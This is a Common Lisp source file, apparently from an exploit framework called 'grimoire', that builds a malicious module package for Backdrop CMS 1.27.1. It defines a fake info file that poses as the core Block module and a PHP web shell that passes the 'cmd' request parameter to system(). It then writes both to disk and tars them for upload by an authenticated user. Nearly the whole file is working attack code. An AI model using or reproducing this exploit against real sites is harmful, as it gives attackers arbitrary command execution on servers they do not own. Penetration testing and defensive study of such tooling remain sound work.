(in-package :grimoire)

(defparameter *payload-info* "type = module
name = Block
description = Controls the visual building blocks a page is constructed with. Blocks are boxes of content rendered into an area, or region, of a web page.
package = Layouts
tags[] = Blocks
tags[] = Site Architecture
version = BACKDROP_VERSION
backdrop = 1.x

configure = admin/structure/block

; Added by Backdrop CMS packaging script on 2024-03-07
project = backdrop
version = 1.27.1
timestamp = 1709862662")

(defparameter *payload-shell* "<html>
<body>
<form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\">
<input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\">
<input type=\"SUBMIT\" value=\"Execute\">
</form>
<pre>
<?php
if(isset($_GET['cmd']))
{
system($_GET['cmd']);
}
?>
</pre>
</body>
</html>")

(defun dog/prepare-payload ()
  (let* ((payload-folder (project-path "shell/"))
         (info-path (merge-pathnames "shell.info" payload-folder))
         (shell-path (merge-pathnames "shell.php" payload-folder)))
    (format t ">>> ~a / ~a~%" info-path shell-path)
    (ensure-directories-exist payload-folder)
    (a:write-string-into-file *payload-info* info-path :if-exists :supersede)
    (a:write-string-into-file *payload-shell* shell-path :if-exists :supersede)
    (uiop:run-program (format nil "tar --create --file=~a ~a ~a"
                              (project-path "shell.tar")
                              info-path
                              shell-path))))

;; (define-exploit backdrop-cms (username password)
;;   :author "Antonio Solana"
;;   :description "PHP shell upload to CMS after login credentials"
;;   :cpe "cpe:2.3:a:backdropcms:backdrop_cms:1.27.1:*:*:*:*:*:*:*"
;;   :capabilities (:exec dog/prepare-payload)
;;   :privileged nil
;;   :check dog/check-vuln
;;   :exploit dog/prepare-payload)